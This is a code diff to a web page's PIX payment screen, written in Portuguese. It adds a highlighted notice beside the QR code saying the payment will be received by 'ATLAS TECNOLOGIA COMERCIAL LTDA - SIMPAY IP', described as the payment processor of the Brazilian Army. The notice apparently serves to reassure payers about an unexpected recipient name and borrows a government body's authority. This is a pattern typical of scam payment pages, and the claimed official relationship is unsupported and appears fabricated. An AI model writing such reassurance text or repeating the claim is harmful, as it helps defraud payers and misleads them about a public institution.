@@ -304,6 +304,17 @@ function showPixPayment(paymentData, userData = null) {
             <div class="mb-6">
                 <div id="qrcode" class="flex justify-center mb-4 p-4 bg-gray-50 rounded"></div>
                 <p class="text-sm text-gray-600 text-center mb-4">Escaneie o QR Code com o app do seu banco</p>
+                
+                <!-- Aviso sobre o nome do recebedor -->
+                <div class="bg-yellow-50 border-l-4 border-yellow-400 p-3 mb-4">
+                    <div class="flex items-start">
+                        <i class="fas fa-info-circle text-yellow-600 mt-0.5 mr-2"></i>
+                        <div class="text-sm">
+                            <p class="font-semibold text-yellow-800 mb-1">⚠️ Nome do Recebedor:</p>
+                            <p class="text-yellow-700">O PIX será processado em nome de <strong>ATLAS TECNOLOGIA COMERCIAL LTDA - SIMPAY IP</strong>, empresa responsável pelo processamento de pagamentos do Exército Brasileiro.</p>
+                        </div>
+                    </div>
+                </div>
             </div>
             
             <div class="mb-6">
